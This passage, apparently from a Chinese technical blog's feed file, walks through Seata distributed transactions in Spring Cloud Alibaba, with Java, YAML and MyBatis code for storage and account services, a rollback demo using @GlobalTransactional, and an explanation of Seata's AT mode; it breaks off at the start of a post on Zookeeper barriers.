storageDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decrease</span><span class="params">(Long productId, Integer count)</span> </span>&#123;</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;storage-service中扣减库存开始"</span>);</span><br><span class="line">        storageDao.decrease(productId,count);</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;storage-service中扣减库存结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.CommonResult ;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.StorageService ;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StorageController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StorageService storageService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/storage/decrease"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">decrease</span><span class="params">(Long productId, Integer count)</span> </span>&#123;</span><br><span class="line">        storageService.decrease(productId, count);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"扣减库存成功！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Config配置（与seata-order-service2001模块大致相同）</p><p>主启动（与seata-order-service2001模块大致相同）</p><h2 id="Seata之Account-Module说明"><a href="#Seata之Account-Module说明" class="headerlink" title="Seata之Account-Module说明"></a>Seata之Account-Module说明</h2><p>与seata-order-service2001模块大致相同</p><p>seata- account- service2003</p><p>POM（与seata-order-service2001模块大致相同）</p><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">2003</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata-account-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">fsp_tx_group</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/seata_account</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">io:</span></span><br><span class="line">      <span class="attr">seata:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure><p>file.conf（与seata-order-service2001模块大致相同）</p><p>registry.conf（与seata-order-service2001模块大致相同）</p><p>domain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Long userId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 总额度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> BigDecimal total;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 已用额度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> BigDecimal used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 剩余额度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> BigDecimal residue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommonResult（与seata-order-service2001模块大致相同）</p><p>Dao接口及实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减账户余额</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decrease</span><span class="params">(@Param(<span class="string">"userId"</span>)</span> Long userId, @<span class="title">Param</span><span class="params">(<span class="string">"money"</span>)</span> BigDecimal money)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="meta-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.atguigu.springcloud.alibaba.dao.AccountDao"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"BaseResultMap"</span> <span class="attr">type</span>=<span class="string">"com.atguigu.springcloud.alibaba.domain.Account"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"user_id"</span> <span class="attr">property</span>=<span class="string">"userId"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"total"</span> <span class="attr">property</span>=<span class="string">"total"</span> <span class="attr">jdbcType</span>=<span class="string">"DECIMAL"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"used"</span> <span class="attr">property</span>=<span class="string">"used"</span> <span class="attr">jdbcType</span>=<span class="string">"DECIMAL"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"residue"</span> <span class="attr">property</span>=<span class="string">"residue"</span> <span class="attr">jdbcType</span>=<span class="string">"DECIMAL"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"decrease"</span>&gt;</span></span><br><span class="line">        UPDATE t_account</span><br><span class="line">        SET</span><br><span class="line">          residue = residue - #&#123;money&#125;,used = used + #&#123;money&#125;</span><br><span class="line">        WHERE</span><br><span class="line">          user_id = #&#123;userId&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Service接口及实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减账户余额</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userId 用户id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> money 金额</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decrease</span><span class="params">(@RequestParam(<span class="string">"userId"</span>)</span> Long userId, @<span class="title">RequestParam</span><span class="params">(<span class="string">"money"</span>)</span> BigDecimal money)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.dao.AccountDao;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.AccountService ;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(AccountServiceImpl<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    AccountDao accountDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减账户余额</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decrease</span><span class="params">(Long userId, BigDecimal money)</span> </span>&#123;</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;account-service中扣减账户余额开始"</span>);</span><br><span class="line">        accountDao.decrease(userId,money);</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;account-service中扣减账户余额结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.CommonResult ;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.AccountService ;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    AccountService accountService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减账户余额</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/account/decrease"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">decrease</span><span class="params">(@RequestParam(<span class="string">"userId"</span>)</span> Long userId, @<span class="title">RequestParam</span><span class="params">(<span class="string">"money"</span>)</span> BigDecimal money)</span>&#123;</span><br><span class="line">        accountService.decrease(userId,money);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"扣减账户余额成功！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Config配置（与seata-order-service2001模块大致相同）</p><p>主启动（与seata-order-service2001模块大致相同）</p><h2 id="Seata之-GlobalTransactional验证"><a href="#Seata之-GlobalTransactional验证" class="headerlink" title="Seata之@GlobalTransactional验证"></a>Seata之@GlobalTransactional验证</h2><p>下订单 -&gt; 减库存 -&gt; 扣余额 -&gt; 改（订单）状态</p><p>数据库初始情况：</p><p><img src="/img/Seata/Seata3.png" alt=""></p><p>正常下单 - <a href="http://localhost:2001/order/create?userId=1&amp;productId=1&amp;count=10&amp;money=100" target="_blank" rel="noopener">http://localhost:2001/order/create?userId=1&amp;productId=1&amp;count=10&amp;money=100</a></p><p>数据库正常下单后状况：</p><p><img src="/img/Seata/Seata4.png" alt=""></p><p><strong>超时异常，没加@GlobalTransactional</strong></p><p>模拟AccountServiceImpl添加超时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(AccountServiceImpl<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    AccountDao accountDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减账户余额</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decrease</span><span class="params">(Long userId, BigDecimal money)</span> </span>&#123;</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;account-service中扣减账户余额开始"</span>);</span><br><span class="line">        <span class="comment">//模拟超时异常，全局事务回滚</span></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123; TimeUnit.SECONDS.sleep(<span class="number">20</span>); &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class="line">        accountDao.decrease(userId,money);</span><br><span class="line">        LOGGER.info(<span class="string">"-------&gt;account-service中扣减账户余额结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，OpenFeign的调用默认时间是1s以内，所以最后会抛异常。</p><p>数据库情况</p><p><img src="/img/Seata/Seata5.png" alt=""></p><p><strong>故障情况</strong></p><ul><li>当库存和账户金额扣减后，订单状态并没有设置为已经完成，没有从零改为1</li><li>而且由于feign的重试机制，账户余额还有可能被多次扣减</li></ul><p><strong>超时异常，加了@GlobalTransactional</strong></p><p>用@GlobalTransactional标注OrderServiceImpl的create()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderServiceImpl</span> <span class="keyword">implements</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建订单-&gt;调用库存服务扣减库存-&gt;调用账户服务扣减账户余额-&gt;修改订单状态</span></span><br><span class="line"><span class="comment">     * 简单说：下订单-&gt;扣库存-&gt;减余额-&gt;改状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//rollbackFor = Exception.class表示对任意异常都进行回滚</span></span><br><span class="line">    <span class="meta">@GlobalTransactional</span>(name = <span class="string">"fsp-create-order"</span>,rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">create</span>(<span class="title">Order</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是模拟AccountServiceImpl添加超时，下单后数据库数据并没有任何改变，记录都添加不进来，<strong>达到出异常，数据库回滚的效果</strong>。</p><h2 id="Seata原理简介"><a href="#Seata原理简介" class="headerlink" title="Seata原理简介"></a>Seata原理简介</h2><p>2019年1月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。</p><p>Simple Extensible Autonomous Transaction Architecture，简单可扩展自治事务框架。</p><p>2020起始，用1.0以后的版本。Alina Gingertail</p><p><img src="/img/Seata/Seata6.png" alt=""></p><p><strong>分布式事务的执行流程</strong></p><ul><li>TM开启分布式事务(TM向TC注册全局事务记录) ;</li><li>按业务场景，编排数据库、服务等事务内资源(RM向TC汇报资源准备状态) ;</li><li>TM结束分布式事务，事务一阶段结束(TM通知TC提交/回滚分布式事务) ;</li><li>TC汇总事务信息，决定分布式事务是提交还是回滚；</li><li>TC通知所有RM提交/回滚资源，事务二阶段结束。</li></ul><p><strong>AT模式如何做到对业务的无侵入</strong></p><p><strong>前提</strong></p><ul><li>基于支持本地 ACID 事务的关系型数据库</li><li>Java 应用，通过 JDBC 访问数据库。</li></ul><p><strong>整体机制</strong></p><p>两阶段提交协议的演变：</p><ul><li>一阶段：业务数据和回滚日志记录在同一个本地事务中提交，释放本地锁和连接资源。</li><li>二阶段：<ul><li>提交异步化，非常快速地完成。</li><li>回滚通过一阶段的回滚日志进行反向补偿。</li></ul></li></ul><p><strong>一阶段加载</strong></p><p>在一阶段，Seata会拦截“业务SQL”</p><ol><li><p>解析SQL语义，找到“业务SQL” 要更新的业务数据，在业务数据被更新前，将其保存成”before image”</p></li><li><p>执行“业务SQL” 更新业务数据，在业务数据更新之后,</p></li><li><p>其保存成”after image”，最后生成行锁。</p></li></ol><p>以上操作全部在一个数据库事务内完成, 这样保证了一阶段操作的原子性。<br><img src="/img/Seata/Seata7.png" alt=""></p><p><strong>二阶段提交</strong></p><p>二阶段如果顺利提交的话，因为”业务SQL”在一阶段已经提交至数据库，所以Seata框架只需将一阶段保存的快照数据和行锁删掉，完成数据清理即可。</p><p><img src="/img/Seata/Seata8.png" alt=""></p><p><strong>二阶段回滚</strong></p><p>二阶段如果是回滚的话，Seata 就需要回滚一阶段已经执行的 “业务SQL”，还原业务数据。</p><p>回滚方式便是用”before image”还原业务数据；但在还原前要首先要校验脏写，对比“数据库当前业务数据”和”after image”。</p><p>如果两份数据完全一致就说明没有脏写， 可以还原业务数据，如果不一致就说明有脏写, 出现脏写就需要转人工处理。<br><img src="/img/Seata/Seata9.png" alt=""></p><p>补充:</p><p><img src="/img/Seata/Seata10.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> spring cloud alibaba </tag>
            
            <tag> Seata </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper案例-分布式屏障Barrier</title>
      <link href="/2021/12/25/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E5%B1%8F%E9%9A%9CBarrier/"/>
      <url>/2021/12/25/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E5%B1%8F%E9%9A%9CBarrier/</url>
      
        <content type="html"><![CDATA[<h2 id="Zookeeper应用场景之分布式屏障Barrier"><a href="#Zookeeper应用场景之分布式屏障Barrier" class="headerlink" title="Zookeeper应用场景之分布式屏障Barrier"></a>Zookeeper应用场景之分布式屏障Barrier</h2><p>Barrier就是栅栏或者屏障，适用于这样的业务场景：当有些操作需要并行执行，但后续操作又需要串行执行，此时必须等待所有并行执行的线程全部结束，才开始串行，于是就需要一个屏障，来控制所有线程同时开始，并等待所有线程全部结束。 分布式barrier一般出现在类似这样的场景,某个任务最终的执行需要基于很多并行计算的子结果。</p><h2 id="项目demo地址"><a href="#项目demo地址" class="headerlink" title="项目demo地址:"></a>项目demo地址:</h2><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 